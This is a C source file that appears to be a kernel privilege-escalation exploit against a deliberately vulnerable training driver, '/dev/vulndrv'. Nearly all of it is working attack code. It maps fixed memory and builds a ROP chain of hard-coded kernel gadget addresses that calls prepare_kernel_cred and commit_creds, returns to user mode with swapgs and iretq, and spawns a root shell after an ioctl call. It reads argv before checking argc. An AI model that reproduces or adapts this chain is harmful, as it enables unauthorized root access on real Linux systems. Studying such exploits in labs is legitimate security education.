#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <assert.h>
#include "drv.h"


#define DEVICE_PATH "/dev/vulndrv"

/*struct drv_req {*/
	/*unsigned long offset;*/
/*};*/


unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;

static void save_state() {
    // save cs, ss, flags
    asm (
            "movq %%cs, %0\n"
            "movq %%ss, %1\n"
            "pushfq\n"
            "popq %2\n"
            : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags)
            :
            : "memory"
        );
}


void shell(void){
    if(!getuid())
    {
        system("/bin/sh");
    }

    exit(0);
}

int main(int argc, char *argv[])
{
    int fd;
    struct drv_req req;
    void *mapped, *temp_stack;
    unsigned long *fake_stack, base_addr;
    unsigned long mmap_addr, stack_addr;
    void * mmaped;

	req.offset = strtoul(argv[1], NULL, 10);
    base_addr  = strtoul(argv[2], NULL, 16);

    // arg: array_offset_decimal array_base_address_hex
    if(argc != 3){
        printf("Wrong argc\n");
        return -1;
    }

    /*req.offset = */
    /*base_addr = */

    printf("array base address = 0x%lx\n", base_addr);
    stack_addr = (base_addr + (req.offset * 8)) & 0xffffffff;
    fprintf(stdout, "stack address = 0x%lx\n", stack_addr);

    mmap_addr = stack_addr & 0xffff0000;
    
    fprintf(stdout, "mmap address = 0x%lx\n", mmap_addr);
    mmaped = mmap(
            (void *)mmap_addr, 
            0x20000, 
            PROT_READ|PROT_WRITE|PROT_EXEC, 
            0x32, // MAP_POPULATE|MAP_FIXED|MAP_GROWSDOWN, 
            0, 
            0
            );
    printf("mmap_addr = 0x%p\n", mmaped);
    assert( mmaped == (void *)mmap_addr );
    printf("[+] mmap 1 ok\n");

    temp_stack = mmap((void *)0x30000000, 0x10000000, 7, 
            0x32, // MAP_POPULATE|MAP_FIXED|MAP_GROWSDOWN, 
            0, 0);
    assert(temp_stack == (void *)0x30000000);
    printf("temp_stack = 0x%p\n", temp_stack);

    save_state(); //

    fake_stack = (unsigned long *)(stack_addr);
    printf("fake_stack: %p\n", fake_stack);
    *fake_stack ++= 0xffffffff810c9ebdUL; // pop rdi; ret

    fake_stack = (unsigned long *)(stack_addr + 0x11e8 + 8);

    *fake_stack++= 0x0UL;               // NULL
    *fake_stack++= 0xffffffff81095430UL; // prepare_kernel_cred
    *fake_stack++= 0xffffffff810dc796UL;  // : pop rdx ; ret
    *fake_stack++= 0xffffffff81095196UL; // commit_creds + 6 // because call
    *fake_stack++= 0xffffffff81036b70UL;  // : mov rdi, rax ; call rdx

    // change to user space
    *fake_stack++= 0xffffffff81052804UL; // swapgs ; pop rbp ; ret
    *fake_stack++= 0xdeadbeefUL;         // dummy placeholder 

    *fake_stack++= 0xffffffff813c6c6b; // iretq
    // iretq stack
    //  RIP
    //  CS
    //  EFLAGS
    //  RSP
    //  SS
    *fake_stack++= (unsigned long)shell;
    *fake_stack++= user_cs;
    *fake_stack++= user_rflags;
    *fake_stack++= (unsigned long)(temp_stack+0x5000000);
    *fake_stack++= user_ss;


    fd = open(DEVICE_PATH, O_RDONLY);

    if(fd == -1) {
        perror("open failed:");
    }

    printf("[  ] ioctl");
    ioctl(fd, 0, &req);


    return 0;
}
